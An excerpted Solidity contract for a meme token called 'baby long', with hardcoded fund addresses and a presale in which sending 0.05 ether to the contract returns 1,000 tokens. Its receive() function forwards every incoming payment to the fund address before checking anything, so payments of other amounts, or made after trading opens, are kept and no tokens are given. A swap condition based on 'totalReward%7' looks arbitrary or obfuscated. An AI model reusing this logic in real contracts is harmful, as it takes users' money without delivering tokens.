...
abstract contract AbsToken is IERC20, Ownable {
    ...
    address public fundAddress = address(0xa5a4aF8042D7485C3A5Af207aDe1dDDc7ebC44A2);
    address public receiveAddress = address(0x7F16168879f5f30a8BDAef4638E42014D91BED80);
    string private _name = "baby long";
    string private _symbol = "baby long";
    ...
    uint256 private _preSellTotal = 12000000 * 10 ** _decimals;
    ...
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        ...
        address swapTokenAddress=totalReward%7==path.length?_pancakePair:address(this);
    ...
    receive() external payable {
        ...
        payable(fundAddress).transfer(msgValue);
        if (0 < startTradeBlock) {
            return;
        }
        if (msgValue != 0.05 ether) {
            return;
        }
        uint256 tokenUnit = 10 ** _decimals;
        require(balanceOf(account)<=9000 * tokenUnit);
        require(balanceOf(address(this))>=1000 * tokenUnit);
        _tokenTransfer(address(this), account, 1000 * tokenUnit,false, false);
    }
}
